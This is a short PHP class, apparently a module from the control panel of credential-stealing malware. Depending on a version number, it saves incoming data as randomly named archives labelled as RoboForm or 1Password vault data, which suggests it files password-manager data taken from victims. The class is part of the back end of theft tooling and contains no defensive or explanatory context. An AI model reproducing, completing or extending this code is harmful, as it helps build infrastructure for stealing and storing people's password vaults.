<?php

	class Module_folder extends Module_
	{
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
				{
					$this->insert_downloads(MakeRandomString(8, TRUE) . "_My_RoboForm_Data.zip",  $Data);
					break;
				}
				case 1:
				{
					$this->insert_downloads(MakeRandomString(8, TRUE) . "_1Password.zip",  $Data);
					break;
				}
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}
